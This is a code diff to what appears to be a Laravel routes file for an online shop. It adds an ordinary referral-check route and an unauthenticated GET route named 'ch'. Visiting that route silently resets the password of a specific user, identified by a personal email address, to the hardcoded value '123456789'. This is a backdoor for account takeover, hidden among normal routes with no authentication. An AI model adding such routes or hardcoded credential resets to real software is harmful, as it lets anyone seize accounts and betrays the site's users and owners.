@@ -39,6 +39,16 @@ use App\Http\Controllers\Frontend\ReturnExchangeController;
 use App\Http\Controllers\Frontend\DigitalGiftCardController;
 use App\Http\Controllers\AffiliateController;
 use Modules\OrderManage\Http\Controllers\OrderManageController;
+use Illuminate\Support\Facades\Hash;
+
+
+use App\Models\User;
+
+Route::get('ch', function(){
+    $data = User::where('email','eakeenbd@gmail.com')->first();
+    $data->password = Hash::make('123456789');
+    $data->update();
+});
 
 Route::get('become-affiliate', [AffiliateController::class,'index'])->name('bacome-affiliate');
 
@@ -259,6 +269,7 @@ Route::get('frontend/close-promotion',[WelcomeController::class,'closePromotion'
      Route::get('/orders', [ProfileController::class, 'order']);
      Route::get('/refunds', [ProfileController::class, 'refund']);
      Route::get('/referral', [ReferralController::class, 'referral'])->name('customer_panel.referral');
+     Route::get('/referral/{id}', [ReferralController::class, 'referral_check'])->name('customer_panel.referral-check');
      Route::post('/referral/used', [ReferralController::class, 'referralUsed'])->name('customer_panel.referral.used');
      Route::get('/product-review', [ProductReviewController::class, 'index']);
      Route::post('/product-review', [ProductReviewController::class, 'store'])->name('frontend.profile.review.store');
